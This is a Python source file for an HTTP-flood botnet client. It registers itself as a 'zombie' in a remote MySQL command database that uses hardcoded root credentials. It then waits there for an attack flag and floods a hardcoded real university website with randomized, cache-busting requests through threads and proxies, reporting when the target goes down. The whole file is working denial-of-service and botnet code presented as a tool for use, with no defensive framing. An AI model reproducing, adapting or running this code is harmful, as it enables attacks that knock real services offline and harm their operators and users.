import pymysql
import socket
import threading
import os
import time
import random
import sys
import requests
import argparse
from urllib.parse import urlparse, unquote

sqlserver = "172.16.28.173"
db = "zombies"
table = "zombie"
sqluser = "root"
sqlpass = "root"
port = 3306
attack = 0


class HTTPFlooder():
    def __init__(self):
        self.proxy_file = 'files/proxy.txt'
        self.ua_file = 'files/user-agents.txt'
        self.ref_file = 'files/referers.txt'
        self.ref = []
        self.ua = []
        self.parseFiles()
        self.ex = threading.Event()

    def parseFiles(self):
        # trying to find and parse file with proxies
        try:
            if os.stat(self.proxy_file).st_size > 0:
                with open(self.proxy_file) as proxy:
                    global ips
                    ips = [row.rstrip() for row in proxy]
            else:
                print('[-]Error: File %s is empty!' % self.proxy_file)
                sys.exit()
        except OSError:
            print('[-]Error: %s was not found!' % self.proxy_file)
            sys.exit()
        # trying to find and parse file with User-Agents
        try:
            if os.stat(self.ua_file).st_size > 0:
                with open(self.ua_file) as user_agents:
                    self.ua = [row.rstrip() for row in user_agents]
            else:
                print('[-]Error: File %s is empty' % self.ua_file)
                sys.exit()
        except OSError:
            print('[-]Error: %s was not found!' % self.ua_file)
            sys.exit()
        # trying to find and parse file with referers
        try:
            if os.stat(self.ref_file).st_size > 0:
                with open(self.ref_file) as referers:
                    global ref
                    ref = [row.rstrip() for row in referers]
            else:
                print('[-]Error: File %s is empty!' % self.ref_file)
                sys.exit()
        except OSError:
            print('[-]Error: %s was not found!' % self.ref_file)
            sys.exit()
        # parse end
        # messaging statistics
        if args.verbosity > 0:
            print('[+]Loaded: {} proxies, {} user-agents, {} referers'.format(len(ips), len(self.ua), len(ref)))

    def request(self, index):
        err_count = 0
        global url
        while not self.ex.is_set():
            timestamp = str(int(time.time()))
            headers = {'User-Agent': random.choice(self.ua),
                       'Referer': random.choice(ref) + url,
                       'Accept-Encoding': 'gzip;q=0,deflate,sdch',
                       'Cache-Control': 'no-cache, no-store, must-revalidate',
                       'Pragma': 'no-cache'}

            if args.proxy:
                proxy = {proto: ips[index]}
            else:
                proxy = None
            if attack:
                try:

                    if args.verbosity > 0:
                        print("[+] HTTP packet sent")
                    if args.auth:
                        from requests.auth import HTTPBasicAuth
                        r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout,
                                         auth=HTTPBasicAuth(auth_login, auth_pass))
                    else:
                        # request = requests.Request(url, data, headers)
                        # urllib.request.urlopen(request)
                        r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout)
                        time.sleep(1)
                        # r= requests.post(url, headers=headers, proxies=proxy, timeout=args.timeout, data=data)
                    if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
                        url = r.headers['Location']
                        print('[!]Request was redirected to {}'.format(url))

                    if r.status_code == 403 or r.status_code == 400:
                        print("[!]Proxy " + ips[index] + " refuse to connect")
                except requests.exceptions.ChunkedEncodingError:
                    pass
                except requests.exceptions.ConnectionError:
                    err_count += 1
                except requests.exceptions.ReadTimeout:
                    pass
            else:
                print("[*]Attack stopped, Waiting for instructions...")

            if err_count >= 20:
                if args.proxy:
                    try:
                        if args.auth:
                            r = requests.get(url + '?' + timestamp, headers=headers,
                                             timeout=args.timeout,
                                             auth=HTTPBasicAuth(auth_login, auth_pass))
                        else:
                            r = requests.get(url + '?' + timestamp, headers=headers,
                                             timeout=args.timeout)
                        if r.status_code == 200:
                            print("[!]Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
                    except requests.exceptions.ConnectionError:
                        print("[+]Target Down!")

                else:
                    print("[+]Target Down!")
                return

    # Creating a thread pool
    def startAttack(self):
        threads = []
        i = 0
        # print(ips)
        # for thread in range(0, len(ips)*num):
        if not args.proxy:
            for thread in range(args.threads):
                t = threading.Thread(target=self.request, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)
        else:
            for i in range(len(ips) * args.threads):
                index = int(i / args.threads)
                t = threading.Thread(target=self.request, args=(index,))
                t.daemon = True
                t.start()
                threads.append(t)

        try:
            while True:
                time.sleep(.05)
        except KeyboardInterrupt:
            self.ex.set()
            print(
                '\r[+]Attack has been stopped!\nGive up to ' + str(args.timeout) + ' seconds to release the threads...')
            for t in threads:
                t.join()

def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((sqlserver, 3306))
        ip = s.getsockname()[0]
    finally:
        s.close()

    return ip

def write_to_db(host, user, pwd, db, port):
    db = pymysql.connect(host=host, user=user,
                         password=pwd, db=db, port=port)
    cur = db.cursor()
    insertsql = "insert into " + table + " (ip) values (\"" + ip + "\");"

    try:
        cur.execute(insertsql)
        db.commit()
    except Exception as e:
        db.rollback()
        raise e
    finally:
        db.close()


def wait_for_ins(host, user, pwd, db, port):
    while True:
        # clear the name
        db = None
        db = pymysql.connect(host=host, user=user, password=pwd, db="zombies", port=port)
        cur = db.cursor()
        cur.execute("select attack from zombie where ip=\"" + ip + "\";")
        global attack
        attack = cur.fetchone()[0]
        '''
        if string[0] == 0:
            db.close()
            os._exit(0)

        else:
            db.close()
        '''
        db.close()


if __name__ == "__main__":
    ip = get_host_ip()
    write_to_db(sqlserver, sqluser, sqlpass, db, port)
    t = threading.Thread(target=wait_for_ins, args=(sqlserver, sqluser, sqlpass, db, port))
    t.start()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # description=textwrap.dedent('''\
        description=("HTTP Flood Tool made By SuPer.Jz(zhe6652)"),
        epilog="if you have any problem, Contact me at zhe6652@gmail.com")

    args = parser.parse_args()
    args.threads = 10
    args.verbosity = 0
    args.timeout = 10
    args.proxy = None
    args.auth = None
    args.target = "http://ip.bjut.edu.cn"

    global url
    url = unquote(args.target)
    # defining protocol
    global proto
    link = urlparse(url)
    proto = link.scheme

    if args.auth:
        global auth_login
        global auth_pass
        auth_login = args.auth[0]
        auth_pass = args.auth[1]

    fd = HTTPFlooder()
    if "http://" not in args.target:
        print("Url should begin with \"http://\"")
        exit(0)

    print('[+]Start sending requests...')

    fd = HTTPFlooder()
    fd.startAttack()
